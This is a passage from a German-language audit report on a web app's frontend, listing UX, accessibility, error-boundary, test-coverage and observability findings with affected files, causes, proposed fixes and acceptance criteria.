**Empfohlene Loesung:** Kritische Titel um „Zurueck schliesst" ergaenzen; mobile Sheets mit Griff + `sheet-up`-Animation standardisieren (Diagnose-Vorgabe).
**Betroffene Architekturentscheidungen:** Dialog-/Sheet-Pattern.
**Alternativen:** Nur Hinweis — Trade-off: schnell.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Hinweis-Texte. 2. Sheet-Standard. 3. Playwright Back-mit-Dialog.
**Tests:** „Dialog offen → back → zu, Route unveraendert"; kein History-Leak.
**Akzeptanzkriterien:** Dokumentiertes Verhalten.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### U-005 Touch-Ziele nur im Touch-Modus; Hover-only-Aktionen

**Kategorie:** UX (Touch/Mobil)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `index.css:646-649` (`[data-input-mode=touch] button{min-height:44px}`), `index.css:433-439,549` (`.dash-runtime-action` 32 px, `opacity:0` bis Hover)
**Betroffene Funktionen oder Komponenten:** Icon-Buttons, Dashboard-Laufzeit-Loeschen
**Problembeschreibung:** Basis-Regel nur bei Touch-Modus (Desktop-Touchscreen/Tablet+Maus/schmal faellt durch). Loeschen unsichtbar bis Hover; Tastatur nur via `:focus-within`, schwacher Kontrast.
**Technische Ursache:** Input-Modus-Heuristik statt universeller Mindestziele.
**Ausloeser:** Hybrid-Laptop, Tastatur-Only.
**Auswirkungen:** Bedienhuerde, Auffindbarkeit.
**Warum es leicht uebersehen wird:** Touch-Geraet-Test gruen; Hybrid ungetestet.
**Empfohlene Loesung:** Mindestziele unabhaengig vom Modus; Hover-Reveal → „immer sichtbar, dezent".
**Betroffene Architekturentscheidungen:** Touch-Ziel-Policy (44 px).
**Alternativen:** Modus-Erkennung verbessern — Trade-off: Heuristik bleibt.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Regel entkoppeln. 2. Reveal ersetzen. 3. Tabwalk-Test.
**Tests:** Playwright Touch-Emulation + Tastatur-Tabwalk.
**Akzeptanzkriterien:** Primaere Aktionen ≥44 px; keine destruktive Hover-only-Aktion.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### U-006 Preview-iframe: generischer Titel, White-Flash, Diagnose-Huerde

**Kategorie:** UX (Preview/Screenreader)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `components/preview/LocalPreviewRuntime.tsx:249-272,353`, `components/DevicePreviewFrame.tsx`
**Betroffene Funktionen oder Komponenten:** iframe-Embedding, Ladezustand, Bridge-Timeout (2,5 s still), Quarantaene-Darstellung
**Problembeschreibung:** `title="Development Preview"` statisch (mehrere Slots ununterscheidbar). `bg-white` blitzt auf dunkler Workbench. Nur „wird verbunden…" ohne Fortschritt. Bridge-Degradation ohne Badge. Quarantaene nutzt gleiches Warn-Icon wie normale Fehler.
**Technische Ursache:** Fehlende Kontext-Durchreichung + White-Default.
**Ausloeser:** 2–3 Previews, langsamer Dev-Server, Quarantaene.
**Beispielszenario:** Screenreader 3× „Development Preview"; Nutzer verwechselt Projekt/Port.
**Auswirkungen:** Verwechslung, Warteabbrueche.
**Warum es leicht uebersehen wird:** Ein Preview sieht gut aus.
**Empfohlene Loesung:** `title={projectName:port+path}`; Hintergrund `ink-950` bis `onLoad`; Quarantaene in Bad-Ton + „Diagnose oeffnen"; Bridge-Badge.
**Betroffene Architekturentscheidungen:** Keine (Darstellung).
**Alternativen:** Keine.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Titel. 2. Hintergrund. 3. Quarantaene-Trennung. 4. Badge.
**Tests:** Axe „iframe title unique"; E2E langsamer Server (Route-Delay).
**Akzeptanzkriterien:** Eindeutige Titel; kein White-Flash im Dark-Video.
**Abhaengigkeiten:** U-003 (Fehler-Aktionen).
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### U-007 Orbit auf kleinen Displays: Canvas-Pflicht, feste Minimap

**Kategorie:** UX (Mobil/Layout)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Medium Confidence
**Betroffene Dateien:** `views/OrbitWorkbench.tsx:1084,1132,1206,1214-1220`, `index.css:1071,1129`
**Betroffene Funktionen oder Komponenten:** `@xyflow/react`-Canvas, Touch-Hinweis (dismissbar), Minimap 144×94, Delete-Zone 320 px, Inspector-`aside`
**Problembeschreibung:** Keine Listen-Alternative; Minimap + Delete-Zone kollidieren auf 390 px; Toolbar scrollt (ok), Inspector ueberdeckt Canvas ohne Griff; Tastatur-Viewport schrumpft (`Verbindungstext` maxLength 80 verdeckt).
**Technische Ursache:** Canvas-first ohne Mobil-Alternative.
**Ausloeser:** 390×844 Portrait + Bildschirmtastatur.
**Auswirkungen:** Orbit mobil nur Betrachter.
**Warum es leicht uebersehen wird:** Desktop-Tests; Notes-390px-Test existiert, Orbit nicht.
**Empfohlene Loesung:** Inspector/Command-Palette mobil als Bottom-Sheet; Minimap kollabierbar; E2E 390 px Orbit-Lifecycle (Analogon Notes).
**Betroffene Architekturentscheidungen:** Mobil-Pattern (Bottom-Sheet-Vorgabe).
**Alternativen:** Nur Minimap-Collapse — Trade-off: halb.
**Trade-offs:** Canvas-Lib (mittel).
**Implementierungsschritte:** 1. Bottom-Sheet. 2. Collapse. 3. E2E 390 px (anlegen/umbenennen/loeschen, kein H-Overflow).
**Tests:** Playwright 390 px; `scrollWidth<=clientWidth`-Assert.
**Akzeptanzkriterien:** Kein H-Overflow; Aktionen ohne Zwei-Finger-Geste.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### U-008 Lange Namen `truncate` ohne Tooltip; grosse Listen ohne Virtualisierung

**Kategorie:** UX (Layout/Datenmengen)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `components/ProjectCard.tsx:53`, `components/Sidebar.tsx:205,373`, `components/AppShell.tsx:333`, `views/Usage.tsx:75` (`slice(0,12)`), `views/PreviewHubProject.tsx:84-89,298`, `.../lib/queryOptions.ts:119` (1,5-s-Poll)
**Betroffene Funktionen oder Komponenten:** Ellipsen ohne `title`; Usage-Breakdown ohne „Alle anzeigen"; Preview-Logs unbegrenzt im DOM (Auto-Scroll nur `filter===all`)
**Problembeschreibung:** Voller Pfad/URL nur in `ProjectDetail.tsx:124` einzeilig; Rest ohne Tooltip. Logs bei verbose Dev-Server tausende Zeilen → Scroll-Jank/Speicher (Backend liefert `truncated` bereits — ungenutzt).
**Technische Ursache:** Fehlende Fensterung + Tooltip-Disziplin.
**Ausloeser:** 120-Zeichen-Namen; viele Services; verbose Logs.
**Auswirkungen:** Performance, Informationsverlust.
**Warum es leicht uebersehen wird:** Kurze Demo-Namen; Logs „scrollen ja".
**Empfohlene Loesung:** `title`-Tooltip ueberall (Touch: Detailseite/Long-press); Logs auf ~500 fenstern + „Gekuerzt"-Badge; Usage-Disclosure.
**Betroffene Architekturentscheidungen:** Listen-Fensterung.
**Alternativen:** Nur Tooltip — Trade-off: Perf bleibt.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Tooltips. 2. Log-Fenster + Badge. 3. Disclosure. 4. Perf-Test 5k Zeilen.
**Tests:** Unit 5k Zeilen (Render-Zeit); E2E lange Namen; <60 fps-Assert.
**Akzeptanzkriterien:** Kein Layoutbruch bei 120 Zeichen; Logs performant.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### U-009 Leere Zustaende ohne naechste Aktion

**Kategorie:** UX (Empty States)
**Schweregrad:** Low
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `views/PreviewHub.tsx:207,280`, `views/PreviewHubProject.tsx:261`, `components/MobileNav.tsx:182-183`, `views/Dashboard.tsx:551` (Negativ); positiv: FileManager, Notizen-Suche, Preview-Logs (3 Texte)
**Betroffene Funktionen oder Komponenten:** Empty-Flaechen
**Problembeschreibung:** „Kein verfuegbares Projekt" ohne Button; „Keine Dienste konfiguriert" nur muted; „Keine Seite sichtbar" ohne „Navigation anpassen".
**Technische Ursache:** Fehlende CTA-Disziplin.
**Ausloeser:** Frische Installation, alles ausgeblendet, Projekt ohne `preview.config.json`.
**Beispielszenario:** Neuer Nutzer vor leerem Hub ohne naechsten Schritt.
**Auswirkungen:** Onboarding-Reibung.
**Warum es leicht uebersehen wird:** Entwickler kennen den naechsten Schritt.
**Empfohlene Loesung:** Jede Empty-Flaeche genau eine primaere Aktion (Projekt oeffnen, Docs-Link, Navigation oeffnen).
**Betroffene Architekturentscheidungen:** Keine.
**Alternativen:** Keine.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Inventar. 2. CTAs. 3. Screenshot-Review.
**Tests:** Screenshot-Review aller Empty-States.
**Akzeptanzkriterien:** Kein Empty ohne CTA/Erklaerung.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### U-010 Form-Labels inkonsistent; Placeholder als einziges Label

**Kategorie:** UX (Formulare)
**Schweregrad:** Low
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `views/OrbitWorkbench.tsx:1220` (Command-Input ohne `<label>`), positiv: `views/PreviewHub.tsx:286`, `.../plugins/PluginMaker.tsx:154-155`, `.../ModalDialog.tsx:112-113`; `modal-form input{font-size:16px}` vs kleinere Orbit-/Search-Inputs
**Betroffene Funktionen oder Komponenten:** Orbit-Command-Suche, mobile Inputs
**Problembeschreibung:** Screenreader nennt nur Dialog-Titel; Placeholder verschwindet beim Tippen; iOS-Zoom-Springen bei <16 px.
**Technische Ursache:** Fehlende Label-Disziplin.
**Ausloeser:** Tastatur/VoiceOver, iPhone-Tastatur.
**Auswirkungen:** A11y-Abzug, Zoom-Springen.
**Warum es leicht uebersehen wird:** Sichtbarer Placeholder „reicht" optisch.
**Empfohlene Loesung:** Sichtbares/`sr-only`-Label; mobile Inputs ≥16 px.
**Betroffene Architekturentscheidungen:** Keine.
**Alternativen:** Keine.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Labels. 2. Font-Groessen. 3. Axe + iOS-Test.
**Tests:** Axe „form-label"; Simulator Zoom-Test.
**Akzeptanzkriterien:** Kein Input ohne Label.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### U-011 Deep-Link-Fallbacks verschlucken Fehler

**Kategorie:** UX (Routing)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Medium Confidence
**Betroffene Dateien:** `extensions/routeHost.tsx:23-32` (NotFound vorbildlich), `views/PreviewHubProject.tsx:68-71`, `views/Notes.tsx:8-18`, `components/hermes/HermesShell.tsx:33` (`safeHermesPath` gut)
**Betroffene Funktionen oder Komponenten:** `?preview=`-, `?note=`-Parameter
**Problembeschreibung:** Unbekannte `?preview=`-ID faellt still auf `mainPort` zurueck — Nutzer haelt Link fuer korrekt. Notizen-Back-nach-Loeschen per E2E ok.
**Technische Ursache:** Fehlende Warn-Branche.
**Ausloeser:** Geteilter Link nach Umkonfiguration; geloeschte Notiz-URL.
**Beispielszenario:** `?preview=alte-id` oeffnet nach Neustart anderes Target ohne Hinweis → falsche Diagnose („ich sehe was anderes").
**Auswirkungen:** Fehlzuordnung.
**Warum es leicht uebersehen wird:** Fallback „zeigt etwas" — kein Crash.
**Empfohlene Loesung:** Warn-Banner „Gesuchtes Preview nicht gefunden, zeige Haupt-Preview" + Auswahl-Link; Notiz-NotFound explizit.
**Betroffene Architekturentscheidungen:** Deep-Link-Semantik (explizit statt still).
**Alternativen:** Harte 404 — Trade-off: strenger.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Banner. 2. E2E ungueltige IDs.
**Tests:** E2E `preview`-/`note`-IDs + 404.
**Akzeptanzkriterien:** Kein stiller Fallback bei expliziten IDs.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### U-012 Reload stellt Daten, aber nicht UI-Zustand wieder her

**Kategorie:** UX (Persistenz)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `views/PreviewHubProject.tsx:76-77` (Filter nur `useState`), `components/ToolPanel.tsx:81,132` (sessionStorage je Panel-ID → neue IDs nach Reload), `views/Usage.tsx`, `e2e/*` (Notes/Orbit-Reload gut)
**Betroffene Funktionen oder Komponenten:** Log-/Service-Filter, Scroll, Diagnose-offen, Slot-Leases
**Problembeschreibung:** Server-Daten ueberleben (Notes/Orbit/Terminal-Runtime). Aber Filter/Scroll/Diagnose/Leases weg oder neu verleast. Restart erzwingt Reload (U-002) → wiederholter Kontext-Verlust.
**Technische Ursache:** Arbeitskontext nicht in URL/Storage.
**Ausloeser:** F5/Restart waehrend Diagnose mit Filter.
**Beispielszenario:** Logs auf „Fehler" gefiltert → Reload → Filter weg.
**Auswirkungen:** Wiederholungsaufwand nach jedem Restart.
**Warum es leicht uebersehen wird:** Daten-Restore getestet; Kontext nicht.
**Empfohlene Loesung:** Filter in URL-SearchParams (`?log=error&service=x`) oder `localStorage`; Diagnose-Zustand pro Projekt merken.
**Betroffene Architekturentscheidungen:** Kontext-Persistenz (URL vs Storage).
**Alternativen:** Nur localStorage — Trade-off: nicht teilbar.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Params. 2. Restore. 3. E2E Filter-Reload.
**Tests:** „Filter setzen → Reload → erhalten".
**Akzeptanzkriterien:** Kritische Kontexte (Filter, Auswahl) reloadfest.
**Abhaengigkeiten:** U-002.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### U-013 Einzelne irreversible Loeschungen ohne Confirm

**Kategorie:** UX (Schutz)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** Positiv mit Confirm: `views/Plugins.tsx:130`, `.../files/FileManagerPanel.tsx:698-704`, `.../SkillEditor.tsx:339`, `.../workspaces/WorkspaceRegistryView.tsx:175`, `.../terminal/sidebar/TerminalSidebar.tsx:374`. Negativ: `.../orbit/OrbitTodoCard.tsx:38` (sofort `saveItems`), `.../orbit/OrbitGalleryNode.tsx:293` (Ordner ohne Dialog; Datei mit `:344`), `.../plugins/PluginCapabilityPicker.tsx:73`, `PluginMaker.tsx:154-155`
**Betroffene Funktionen oder Komponenten:** Trash-Icons in Orbit/Plugin-Editor
**Problembeschreibung:** Mehrheit geschuetzt. Luecken bei schnell klickbaren Icons — Touch-Fehl-Tap wahrscheinlich, kein Undo (globaler Orbit-Undo nicht kommuniziert).
**Technische Ursache:** Inkonsistente Schutz-Disziplin.
**Ausloeser:** Touch 390 px, Zittern, Verwechslung.
**Beispielszenario:** Lange Orbit-Aufgabe per Fehl-Tap weg.
**Auswirkungen:** Kleiner Datenverlust, Vertrauensverlust.
**Warum es leicht uebersehen wird:** FileManager-Muster existiert — Uebertragung vergessen.
**Empfohlene Loesung:** Auch dort `ConfirmDialog` oder Undo-Toast (5 s), konsistent mit FileManager.
**Betroffene Architekturentscheidungen:** Loesch-Pattern (Confirm oder Undo ueberall).
**Alternativen:** Nur Undo — Trade-off: komplexer.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Stellen inventarisieren. 2. Pattern uebertragen. 3. Unit-Tests.
**Tests:** „Loeschen → Confirm → erst dann `saveItems`".
**Akzeptanzkriterien:** Keine irreversible Loeschung ohne Confirm/Undo.
**Abhaengigkeiten:** U-014 (Pending-State gemeinsam).
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### U-014 ConfirmDialog ohne Pending-State (Doppelklick-Risiko)

**Kategorie:** UX (Doppeleingaben)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `components/ModalDialog.tsx:74-82` (`onConfirm(); requestClose()` synchron), `views/DashboardRuntime.tsx:256,265` (Label wechselt, Button nicht `disabled`); positiv: Theme-Speichern, Preview Start/Stop (`disabled` + `isPending`); E2E `negative.spec.ts:50`
**Betroffene Funktionen oder Komponenten:** Generischer `ConfirmDialog`
**Problembeschreibung:** Schließt sofort, erlaubt Doppelklick waehrend Mutation; Fehler nach Schliessen nirgends (Plugin-Deinstall, Workspace-Entfernen). Zweite Mutation 404 → still; Geister-Eintraege bis Refetch.
**Technische Ursache:** Fehlender Pending-Zustand.
**Ausloeser:** Doppelklick „Endgueltig loeschen", langsames Netz.
**Auswirkungen:** Inkonsistente UI.
**Warum es leicht uebersehen wird:** Theme-Muster existiert — Dialog generisch anders.
**Empfohlene Loesung:** `confirmPending`-Prop (disabled + Spinner); Fehler im Dialog halten statt schliessen.
**Betroffene Architekturentscheidungen:** Dialog-Async-Pattern.
**Alternativen:** Nur disabled ohne Fehler-Halten — Trade-off: halb.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Prop. 2. Alle Delete-Flows. 3. Doppelklick-Tests.
**Tests:** Unit Doppelklick analog Theme-Test.
**Akzeptanzkriterien:** Keine doppelte Mutation bei Doppelklick.
**Abhaengigkeiten:** U-013.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### U-015 Tastatur/Screenreader: Shell vorbildlich, Canvas/Terminal/Edge Luecken

**Kategorie:** UX (A11y)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** Positiv: `components/AppShell.tsx:294-295,344` (Skip-Link, `aria-live`, Main-Fokus), `lib/useModalFocus.ts`, `views/PreviewTargetMenu.tsx` (Roving-Focus, Escape). Luecken: `views/OrbitWorkbench.tsx:1091` (`tabIndex={0}` ohne `role`/`aria-label`), `:1214` (Edge-Menue `role=dialog` ohne Trap), `.../terminal/WebTerminal.tsx:66` (Viewport ohne Label, xterm-A11y unklar), `views/Usage.tsx:70` (Chart `role=img`, keine Tabelle)
**Betroffene Funktionen oder Komponenten:** Orbit-Canvas, Terminal, Edge-Editor, Charts
**Problembeschreibung:** Basis-Navigation gut; Fachflaechen Maus-first. Blinder Nutzer erreicht Orbit-Knoten/Terminal-Ausgabe nicht.
**Technische Ursache:** Fehlende Rollen/Traps/Alternativen.
**Ausloeser:** Reine Tastatur/Screenreader.
**Auswirkungen:** Ausschluss, Audit-Abzug.
**Warum es leicht uebersehen wird:** Maus-Tests gruen; Tastatur-Durchgang fehlt.
**Empfohlene Loesung:** Canvas-Wrapper `role=application` + Label + Shortcuts-Doku; Edge-Menue in Trap/Popover mit Fokus-Ruecksprung; Terminal-A11y-Addon + `aria-live`-Log; Charts zusaetzlich als Tabelle (Usage-Daten vorhanden).
**Betroffene Architekturentscheidungen:** A11y-Standard je Flaeche.
**Alternativen:** Nur Doku — Trade-off: keine Abhilfe.
**Trade-offs:** Mittel (Fachflaechen).
**Implementierungsschritte:** 1. Rollen/Labels. 2. Trap. 3. Terminal-Addon. 4. Tabellen. 5. Durchgang.
**Tests:** Axe + manueller Tastatur-Durchgang (Tab/Shift-Tab/Escape) je Flaeche; Screenreader-Smoke.
**Akzeptanzkriterien:** Alle Aktionen tastaturerreichbar; kein Fokusverlust.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### U-016 Design-System: keine harten Verstoesse, drei Ausnahme-Zonen

**Kategorie:** UX (Design-System)
**Schweregrad:** Low
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/web/src/index.css` (`@theme` einzige Quelle; `.hermes-shell:230-249` erlaubt; weisse Preview-/Canvas-Flaechen erlaubt), `components/notes/note-blocks.css:8-16,214-219`, `stores/nodeColors.ts:14-16`, `lib/orbitAppearance.ts:6,22,31`, `components/icons/WorkbenchIcons.tsx` (`var(--icon-*, #hex)`-Fallbacks korrekt); Gradients nur funktional (`index.css:2831,2960`); keine UI-Emojis (nur Tests)
**Betroffene Funktionen oder Komponenten:** Notiz-/Orbit-Paletten, Icon-Fallbacks
**Problembeschreibung:** `grep` ausserhalb `index.css/visual-system.css`: ~150 Treffer, fast alle Fallbacks/Tests/Kommentare/fachliche Paletten (Orbit-Kanten brauchen 500er-Stufen auf `#0a0a0a`; Notiz-Highlight eigene Skala). Kein AI-Slop. Wartungs-Thema: Ausnahmen nicht als Tokens versioniert.
**Technische Ursache:** Fachliche Sonderpaletten ohne Token.
**Ausloeser:** Wartung/Theme-Wechsel.
**Auswirkungen:** Gering (Wartung).
**Warum es leicht uebersehen wird:** Sieht „fertig tokenisiert" aus.
**Empfohlene Loesung:** Nichts Blockierendes. Paletten als `@theme`-Tokens voll tokenisieren (`--note-*`, `--orbit-*` teils vorhanden); Fallback-Hex by design lassen; neuer Lint „kein Hex in `*.tsx` ausser Fallback/Test".
**Betroffene Architekturentscheidungen:** Token-Vollstaendigkeit.
**Alternativen:** Lassen — Trade-off: ok.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Tokens. 2. Lint. 3. Doku Ausnahmen.
**Tests:** Bestehender `grep`-Check + neuer Lint.
**Akzeptanzkriterien:** Ausnahmen im Theme dokumentiert.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### Q-001 ErrorBoundary-Retry kann loopen; AppShell nicht eingegrenzt

**Kategorie:** Testing/Stabilitaet (Error Boundaries)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `components/ErrorBoundary.tsx:32,36-49`, `extensions/routeHost.tsx:42-50`, `main.tsx:79-81`
**Betroffene Funktionen oder Komponenten:** Pro-Route-Boundary (`DeferredRoute`, `key=mountedPath` — gut, Sidebar bleibt bedienbar); `retry` setzt nur `failed:false`; AppShell (Sidebar/Topbar/StatusBar) ohne Boundary → Fall bis globale `Wrapt`-Boundary
**Problembeschreibung:** Bei Lazy-Fehler wirft dieselbe `lazy()`-Komponente sofort erneut → „Erneut versuchen" blinkt zurueck. Sidebar-Store-Fehler (z. B. korrupte Preferences nach Migration) → ganze App leer + Crash-Dialog, keine Navigation. `silent`-Prop deutet bekannte Luecke an.
**Technische Ursache:** Retry ohne `key`-Bump/Lazy-Cache-Invalidierung; fehlende Segment-Boundaries.
**Ausloeser:** Kaputter Node-Renderer; korrupte Sidebar-Preferences.
**Beispielszenario:** Korrupt → jede Route weiss, nur Reload hilft.
**Auswirkungen:** Totalausfall statt Teilausfall.
**Warum es leicht uebersehen wird:** Einzelne View-Crashes abgefangen — Shell-Crash selten.
**Empfohlene Loesung:** Retry mit `key`-Bump + Lazy-Cache-Invalidierung; AppShell-Segmente je eigene Boundary mit Label; `silent` nur nicht-kritische Inseln.
**Betroffene Architekturentscheidungen:** Boundary-Topologie.
**Alternativen:** Nur key-Bump — Trade-off: Shell bleibt offen.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Bump. 2. Segment-Boundaries. 3. `silent`-Policy. 4. Loop-Tests.
**Tests:** Unit „wirft zweimal → Fallback stabil, kein Loop"; E2E „kaputte Route → andere bedienbar".
**Akzeptanzkriterien:** Einzelner View-Crash blockiert nie Navigation.
**Abhaengigkeiten:** Q-002 (Schwere-Stufen gemeinsam).
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### Q-002 Fehler ohne Ausweg / Dialog bei Bagatellen

**Kategorie:** Testing/Stabilitaet (Fallbacks)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `components/QueryBoundary.tsx:43-45` („Keine Daten verfuegbar." ohne Button), `lib/crashReport.ts:267-289`, `components/CrashReportDialog.tsx:108`
**Betroffene Funktionen oder Komponenten:** `reportCrash`-Global-Handler (`unhandledrejection` → blockierender Dialog)
**Problembeschreibung:** `data===undefined` ohne Fehler/Loading = Sackgasse (kein Retry). Umgekehrt oeffnet jede `unhandledrejection` Vollbild-Dialog — auch abgebrochene Mutationen/Preview-Save (Toast wuerde reichen). „Weiterarbeiten" vs Fallback verwirrend.
**Technische Ursache:** Fehlende Schwere-Stufen.
**Ausloeser:** Leere 204, Race beim Routenwechsel, Hintergrund-500.
**Beispielszenario:** Hintergrund-Sync 500 → Vollbild unterbricht Editor-Tippen → Gewoehnung („immer wegklicken").
**Auswirkungen:** Fehlalarme, Sackgassen.
**Warum es leicht uebersehen wird:** Dialog „meldet alles" wirkt gruendlich.
**Empfohlene Loesung:** „Keine Daten" + Retry; `reportCrash` nur Render/`error`, Promise als Breadcrumb + Toast; Dialog nur ohne Boundary; Stufen.
**Betroffene Architekturentscheidungen:** Fehler-Schwere-Modell.
**Alternativen:** Nur Retry-Button — Trade-off: Fehlalarme bleiben.
**Trade-offs:** Verhalten aendern (mittel).
**Implementierungsschritte:** 1. Retry. 2. `isBenignError`-Matrix. 3. Stufen. 4. E2E Hintergrund-500 → kein Dialog.
**Tests:** Unit Matrix; E2E.
**Akzeptanzkriterien:** Kein Vollbild fuer behebbare Hintergrundfehler.
**Abhaengigkeiten:** Q-001.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### Q-003 Testabdeckung: stark bei Notes/Orbit/Settings, Luecken Restart/Preview/Terminal/A11y

**Kategorie:** Testing
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** 166 `*.test.*` in `apps/web/src`; `e2e/journeys.spec.ts:37`, `negative.spec.ts:127`, `impact.spec.ts:238`; Abdeckung u. a. Notes-Lifecycle/Reload/Papierkorb, Orbit-Lifecycle, Theme-Doppelklick, Serverfehler-Retry (Projects), 390px-Notes, Offline-Notes, Settings-Impact-Matrix, Stores/Query/CrashReport/Preview-Helfer/Terminal-Modelle
**Betroffene Funktionen oder Komponenten:** Siehe Testplan Abschnitt 11
**Problembeschreibung:** Fehlt: `SystemRestartControls.useSystemRestart` (0 Tests: Polling/bootId/webBuildId/Timeout/Abbruch), T3-Downgrade-Confirm, `PreviewSlotRecovery`/Quarantaene, `NotificationCenter`-Reconnect, `HermesAdminFrame` (nur Pfad), `WebTerminal` (gemockter Dialog), Listen-/Log-Performance, Tastatur-Traps, Kontrast/Axe, Cross-Browser (nur Chromium?), Import-Export/beschaedigte Daten (Orbit-Version, Notes-Frontmatter).
**Technische Ursache:** Kritische Flows spaet hinzugefuegt, Tests nicht mitgewachsen.
**Ausloeser:** Refactoring an Restart/Preview/Terminal.
**Auswirkungen:** Refactoring ohne Netz.
**Warum es leicht uebersehen wird:** 166 Tests + gruene Pipeline wirken „abgedeckt".
**Empfohlene Loesung:** Priorisierter Testplan (Abschnitt 11) abarbeiten: sofort Restart/Boundary/Confirm/Redaction, dann Quarantaene/500/Deep-Links/Trap, vor Release 390px-Orbit/Axe/Offline-Matrix/Cross-Browser/Last.
**Betroffene Architekturentscheidungen:** Test-Prioritaeten (Abschnitt 11).
**Alternativen:** Keine.
**Trade-offs:** Nur Aufwand (niedriges Risiko).
**Implementierungsschritte:** Siehe Abschnitt 11.
**Tests:** Meta: je kritischer Flow ≥1 automatisierter Test.
**Akzeptanzkriterien:** Restart/Quarantaene/Terminal-tot/Dialog-Trap je ≥1 Test.
**Abhaengigkeiten:** U-002/Q-001/U-014/Q-004.
**Geschaetzter Umfang:** Medium-Large
**Risiko bei der Umsetzung:** Low

### Q-004 Observability Frontend: Breadcrumbs gut, keine Level/Korrelation/Metriken, PII im Report

**Kategorie:** Testing/Observability
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `lib/crashReport.ts:25-71,151-169` (Ring 50, Dedup, `currentRoute` — positiv), `main.tsx:52-63,67-71` (Query-Fehler-Breadcrumb mit vollem `queryKey`-JSON; Crash-Report mit Route/Version/bootId/Viewport), `lib/apiClient/transport.ts:8-20` (`requestId/retryable` vorhanden, nie angezeigt), `lib/queryOptions.ts`, `views/Dashboard.tsx:776-787`, `components/AppShell.tsx:343` (nur `navigator.onLine`), `components/CrashReportDialog.tsx:18-35`
**Betroffene Funktionen oder Komponenten:** Breadcrumbs, Crash-Report (`createCrashNotification`), Health-Panels
**Problembeschreibung:** Keine Level (alles String), keine Korrelations-ID in UI (Backend liefert `x-request-id`), keine Web-Vitals, keine Aggregation (nur Dialog + Kopieren), keine Alarmierung (degraded ohne Toast/Badge), kein Frontend-Audit (wer loeschte was?). Sensibel: `queryKey`-JSON + Klick-Labels (80 Zeichen, Pfade/Titel) + `console.error` unredigiert an Server — keine Schwaerzung (E-Mails in Usage-Accounts).
**Technische Ursache:** Observability punktuell statt E2E (mit S-014/D-014).
**Ausloeser:** Jeder Frontend-Fehler.
**Auswirkungen:** Schwer debuggbar („welcher Request?"), Privacy-Risiko, spaete Ausfall-Erkennung.
**Warum es leicht uebersehen wird:** Breadcrumbs + Report wirken „instrumentiert".
**Empfohlene Loesung:** `requestId` in Boundary/Toast + Breadcrumb; `addBreadcrumb({level,...})`; PII-Redaction vor `createCrashNotification` (E-Mail/Pfad kuerzen); API-Down-Banner aus `health` (nicht nur onLine); Web-Vitals-Counts (keine Inhalte).
**Betroffene Architekturentscheidungen:** Frontend-Observability (mit Abschnitt 12).
**Alternativen:** Nur Redaction — Trade-off: Debug-Luecke bleibt.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. requestId. 2. Level. 3. Redaction. 4. Down-Banner. 5. Vitals-Counts.
**Tests:** Unit Redaction + Anzeige; E2E „Backend 500 → Banner + Retry".
**Akzeptanzkriterien:** Jeder Fehler mit `requestId`; keine E-Mail/Pfade im Report.
**Abhaengigkeiten:** D-013/D-014, S-014, Abschnitt 12.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

## 5. Edge Case Catalogue

